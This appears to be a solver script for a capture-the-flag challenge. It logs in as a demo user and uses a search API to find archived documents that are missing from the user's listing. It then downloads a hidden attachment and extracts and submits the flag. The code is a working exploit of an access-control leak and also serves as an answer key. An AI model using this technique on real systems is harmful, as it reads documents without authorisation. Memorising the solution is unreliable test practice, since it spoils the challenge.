from __future__ import annotations

import argparse
import re

import requests


DOC_RE = re.compile(r"KB-2026-\d{4}")
FLAG_RE = re.compile(r"flag\{[^}]+\}")


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    root = target_url.rstrip("/")
    client.get(root + "/", timeout=10).raise_for_status()
    client.post(root + "/login", data={"username": "demo", "password": "demo-pass"}, timeout=10).raise_for_status()
    listed = client.get(root + "/documents", timeout=10)
    listed.raise_for_status()
    listed_ids = set(DOC_RE.findall(listed.text))
    client.get(root + "/search", timeout=10).raise_for_status()
    results = client.get(root + "/api/search", params={"q": "安全"}, timeout=10)
    results.raise_for_status()
    archived = [item for item in results.json().get("items", [])
                if item.get("status") == "archived" and item.get("document_id") not in listed_ids]
    if not archived:
        raise RuntimeError("search index did not reveal an archived document")
    document_id = archived[0]["document_id"]
    detail = client.get(root + "/documents/" + document_id, timeout=10)
    detail.raise_for_status()
    attachment = re.search(r"href=['\"](/download/[^'\"]+)", detail.text)
    if not attachment:
        raise RuntimeError("archived document did not reveal an attachment")
    report = client.get(root + attachment.group(1), timeout=10)
    report.raise_for_status()
    match = FLAG_RE.search(report.text)
    if not match:
        raise RuntimeError("audit attachment did not contain a flag")
    flag = match.group(0)
    if control_url and instance_id:
        submitted = requests.post(control_url.rstrip("/") + f"/api/v1/instances/{instance_id}/submit",
                                   json={"flag": flag}, timeout=10)
        submitted.raise_for_status()
        if not submitted.json().get("data", {}).get("correct"):
            raise RuntimeError("backend rejected the discovered flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target_url")
    parser.add_argument("--control-url")
    parser.add_argument("--instance-id")
    args = parser.parse_args()
    if bool(args.control_url) != bool(args.instance_id):
        parser.error("--control-url and --instance-id must be provided together")
    print(solve(args.target_url, args.control_url, args.instance_id))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
